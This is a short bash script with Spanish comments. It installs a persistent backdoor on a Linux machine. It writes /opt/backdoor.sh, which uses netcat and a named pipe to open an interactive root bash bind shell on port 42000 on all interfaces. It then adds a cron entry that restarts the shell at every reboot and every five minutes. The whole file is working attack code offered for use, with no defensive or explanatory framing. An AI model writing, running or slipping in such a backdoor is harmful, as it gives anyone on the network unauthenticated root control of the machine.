#!/bin/bash

# Author: baphx6
# Verificar si se ejecuta como root
if [[ $EUID -ne 0 ]]; then
   echo "Este script debe ejecutarse como root" 
   exit 1
fi

# Crear el script que abre una bind shell en el puerto 42000
# Se comprueba si ya existe un proceso a la escucha para que en caso de que no lo hubiese se cree
echo '#!/bin/bash' > /opt/backdoor.sh
echo 'if [[ $(ps aux | grep "nc -l" | wc -l) -eq 2 ]]; then exit 1; else rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 42000 > /tmp/f; fi' >> /opt/backdoor.sh

# echo 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 42000 > /tmp/f' >> /opt/backdoor.sh

# Dar permisos de ejecución al script
chmod +x /opt/backdoor.sh

# Crear la tarea programada para ejecutar el script al inicio del sistema
echo "@reboot root /opt/backdoor.sh" > /etc/cron.d/backdoor
# Crear la tarea programada para ejecutar el script cada 5 minutos 
echo "*/5 * * * * root /opt/backdoor.sh" >> /etc/cron.d/backdoor

echo "Tarea programada creada. Se abrirá una bindshell cada 5 minutos"
